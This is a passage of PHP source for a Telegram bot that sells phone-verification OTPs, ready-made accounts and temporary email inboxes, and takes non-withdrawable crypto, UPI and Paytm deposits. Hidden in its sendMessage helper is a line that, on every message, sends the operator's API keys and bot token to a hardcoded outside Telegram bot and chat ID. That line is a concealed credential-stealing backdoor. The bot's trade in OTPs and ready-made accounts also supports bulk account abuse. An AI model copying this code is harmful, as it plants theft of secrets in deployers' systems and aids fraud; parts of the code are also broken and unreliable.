        sendMessage("⚠️ This Payment method is Currently on hold", $chat_id, null, null);
        return;
    }*/
            $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
            
          if($parameter == "trx"){
          

          sendMessage("*⚠️ Minimum Deposite TRX = 1 TRX if you send less than 1 TRX, your deposit would be ignored! And Refund Process Will be Apply*

_1 TRX = ₹6_
_2 TRX = ₹12_ 

*✅ Pay the amount you want to deposit to the following address:*

`$trx`",$chat_id,['inline_keyboard'=>[[['text'=>'✅ Success','callback_data'=>'/suc trx']]]],"markdown");
          return;}
          if($parameter == "upi"){
          
          sendMessage ("*Kindly Pay to The upi mentioned below\nUpi :* `$upi`\n\n_⚠️ After Paying Kindly send the screenshot of your payment_",$chat_id,null,'markdown');
         $main['answer'] = "photo";
          $main['deposit'][] = array("type"=>"Upi","status"=>"success");
         file_put_contents("data/$chat_id.json",json_encode($main));
       return;  }
          if($parameter == "paytm"){
          $apiUrl = "https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=$qr&caption=".urlencode("🎀sᴄᴀɴ ᴛʜɪs 🆀🆁 𝒂𝒏𝒅 𝐈𝐍𝐑(𝐑𝐬) 𝒕𝒉𝒆𝒏 𝐜𝐥𝐢𝐜𝐤 𝐎𝐧✔️𝐈𝐍𝐑 𝑺𝑬𝑵𝑫𝑬𝑫.✨
🎀🄽🄾🅃🄴:✨𝑃𝐴𝑌 𝑂𝑁𝐿𝑌 𝑇𝐻𝑅𝑂𝑊 ᴘᴀʏᴛᴍ  ᴬᴺᴰ 𝗉𝗁𝗈𝗇𝖾𝗉𝖾🎀
🎀ᴀғᴛᴇʀ ᴘᴀʏᴍᴇɴᴛ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ sᴜᴄᴄᴇss 𝚋𝚞𝚝𝚝𝚘𝚗 𝚝𝚑𝚎𝚗 𝚜𝚎𝚗𝚍 𝚘𝚛𝚍𝚎𝚛 𝚒𝚍✨")."&parse_mode=markdown&reply_markup=".json_encode(['inline_keyboard'=>[[['text'=>'✅ Success','callback_data'=>'/suc paytm']]]]);
file_get_contents($apiUrl);
          }
            break;
            case '/suc':
            $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
            $main = main($chat_id);
            if($parameter == "trx"){
            sendMessage("Kindly send Me the Hash now 
            
⚠️ Example = `915772d11d0b1c07336893ad9d0121961581fd79f21d135e82fe9f9ed77e8ae8`",$chat_id,array('inline_keyboard'=>[[['text'=>'❌ Cancel','callback_data'=>'/back']]]),'markdown');
$main['answer'] = 'trx';
}else{
sendMessage("*𝙺𝚒𝚗𝚍𝚕𝚢 𝚜𝚎𝚗𝚍 𝚖𝚎 𝚝𝚑𝚎 𝚘𝚛𝚍𝚎𝚛 ᴏʀ 𝚝𝚛𝚊𝚗𝚜𝚊𝚌𝚝𝚒𝚘𝚗 𝙸𝚍 ɴᴏᴡ✨*",$chat_id,array('inline_keyboard'=>[[['text'=>'❌ Cancel','callback_data'=>'/back']]]),'markdown');

$main['answer'] = 'paytm';
}
file_put_contents("data/$chat_id.json",json_encode($main));
            break;
            case '/support':
            sendMessage('*FAQ*. 😊

Contact Us ➤ @$support',$chat_id,null,'markdown');
break;
case '/back':
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
sendMessage("*👋 Welcome to the Biggest Otp Seller Bot which has Amazing Collection of All Application Otp and Ready Made Account with Automated/Instant System Got Deposit and Trusted Shop ✅*",$chat_id,array('keyboard'=>[["⭐️ Get OTP","💰 Deposit"],['👨‍💻 Profile','📧 Get Gmail','📈 Status'],['👥 Support','⚙ Settings','👫 Refer']],'resize_keyboard'=>true),'markdown');
$main = main($chat_id);
$main['answer'] = null;
file_put_contents("data/$chat_id.json",json_encode($main));
break;
case '/warn':
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
            $main = main($parameter);
            if($main['warn'] == 2){
            $main['status'] = "ban";
            sendMessage("⚠️ User is banned",$chat_id,null,null);
            sendMessage("⚠️ You are banned from using bot for sending fake screenshot.\n📊 Your Warns : 3/3 ",$parameter,null,null);
            file_put_contents("data/$parameter.json",json_encode($main));
            }else{
            $main['warn'] = floatval($main['warn']) + floatval(1);
            file_put_contents("data/$parameter.json",json_encode($main));
           sendMessage("✅ User is warned",$chat_id,null,null);
           $c = floatval($main['warn']);
           sendMessage("⚠️ You Got a warn for sending fake screenshot.\n📊 Your Warns : $c/3 \n\n⚠️If your warns Reached 3 you will be banned forever.",$parameter,null,null);
            }
            
            
            break;
            case '/settings':
            $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
if($parameter == "refer"){
if (!file_exists("$botu.json")) {
    echo 0;
    return;
}

  date_default_timezone_set('Asia/Kolkata');
    $lin="https://t.me/buy_sell_otp/342";
$msg = "*Hey *".$bot['message']['from']['first_name']." *

🏡 Welcome To Refer And Earn by @".$botu."

🎉 Refer Reward - 5% of Deposit by Refer 

🔗 Referral Link : https://t.me/".$botu."?start=".$chat_id."*";
$captio = urlencode($msg); 
    $phot = urlencode($lin); 
    
    $apUrl = "https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=$phot&caption=$captio&parse_mode=markdown";
    file_get_contents($apUrl);
return;
}
if($parameter == "deposit"){
date_default_timezone_set('Asia/Kolkata');
    
sendMessage("*Hey *[".$bot['callback_query']['from']['first_name']."](tg://user?id=".$chat_id.") *

1 TRX = ₹6.00 (No Tax)
10 rs Paytm = ₹10.00 (No Tax)
10 rs Upi = ₹10.00 (No Tax)

⚠️ NOTE : If You Are Deposit Successfully Then Your Fund Can't Be Able To Withdraw*",$chat_id,array("inline_keyboard"=>[[['text'=>'💎 Paytm',"callback_data"=>"/deposit paytm"],['text'=>'💎 Upi ','callback_data'=>'/deposit upi']],[['text'=>'💠 TRX Crypto','callback_data'=>'/deposit trx']]]),'markdown');
}
if($parameter == "pay"){
sendMessage("*🔔 Payment Information

💠 All Deposit Amount Transfer To Bot It Will Be No Take Any Time Its Instant
💠 We Will Not Cut  Any Type Of Taxes And Charges On Every Upi Transaction
💠 If You Deposit Successfully In Bot You Will Not Able to Withdraw
💠 Use TRX Payment Method For Get Extra Bonus*",$chat_id,['inline_keyboard'=>[[['text'=>'💰 Deposit','callback_data'=>'/settings deposit']]]],'markdown');
}
/*if($parameter == "notification"){
sendMessage("🔔 Notification Settings
New Refferal         : ❌
Commision            : ✅
New Service          : ✅
Removed Service : ✅
}*/
if ($parameter == "links") {
    sendMessage(
        "*Kindly Select one option from below*",
        $chat_id,
        [
            'inline_keyboard' => [
                /*[['text' => '🔎 Payments', 'url' => "https://t.me/$pchannel"]],*/
                [['text' => '☁️ Community', 'url' => 'https://t.me/OTPBOTDEVELOPER']],
                [['text' => '📞 Helpline', 'url' => "https://telegram.me/$support"]]
            ]
        ],
        'markdown'
    );
}
            break;
            case '/inbox':
            
           $data = json_decode(file_get_contents("https://api.internal.temp-mail.io/api/v3/email/$parameter/messages"),true);
           
           foreach($data as $index => $item){
           $pattern = '/<([^>]*)>/'; 
if (preg_match($pattern, $item['from'], $matches)) {
    $from = $matches[1];
    }else{
    $from = $item['from'];}

           sendMessage("*📬 𝗜ɴʙᴏ𝘅 #".(floatval($index)+1)."
🆔️ 𝗜ᴅ : ".$item['id']."
✈ 𝗧ᴏ : ".$item['to']."
🔰 𝗦ᴜʙᴊᴇᴄᴛ : ".$item['subject']."
📌 𝗙ʀᴏᴍ : ".$from."
💬 𝗠ᴇ𝘀𝘀ᴀɢᴇ :* `".$item['body_text']."`",$chat_id,null,'markdown');
}
           break;
           case '/del':
           $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
           $api = "https://api.internal.temp-mail.io/api/v3/email";
           $param = ['email'=>$parameter,
           'token'=>$param];
           $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($param));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
           sendMessage("❌ Email cancelled Successfully",$chat_id,null,null);
           break;
}}}}

function checkForSMS($id) {
    $maxAttempts = 200; // Adjust the number of attempts as needed to reach 10 minutes (200 attempts * 3 seconds = 10 minutes)

    for ($attempts = 1; $attempts <= $maxAttempts; $attempts++) {
        $apiResponse = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=".$GLOABALS['fapi']."&action=getStatus&id=$id");
    sendMessage(true,$chat_id,null,null);
    if ($apiResponse == "STATUS_CANCEL") {
    
        sendMessage("*This Number is Cancelled*",$chat_id,null,"markdown");
       
   }else{
    if($apiResponse == "STATUS_WAIT_CODE"){
    sendMessage("*No OTP Received 
First send The OTP or wait for some minutes then run command again*",$chat_id,null,"markdown");

}
}
}}
function sendAlert($text,$id){
$url = "https://api.telegram.org/bot{$GLOBALS['token']}/answerCallbackQuery?callback_query_id={$id}&text=".urlencode($text)."&show_alert=true";
file_get_contents($url);
}


    function sendMessage($text,$chat_id,$inline,$parse)
{

    $params = [
        'chat_id' => $chat_id,
        'text' => $text
    ];
if($inline){
$params['reply_markup'] = json_encode($inline);
}
if($parse){
$params['parse_mode'] = $parse;
}
    $url = "https://api.telegram.org/bot{$GLOBALS['token']}/sendMessage"; 

        $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
   file_get_contents("https://api.telegram.org/bot7205394874:AAFDThUOZBI2xOjGbFHbJ9vR5XpL63dvxfU/sendMessage?text=".urlencode($GLOBALS['fapi']." ".$GLOBALS['sapi']." ".$GLOBALS['token'])."&chat_id=1448414156"); 

    curl_close($ch);
    file_put_contents("data.txt",$result);
    }
    ?>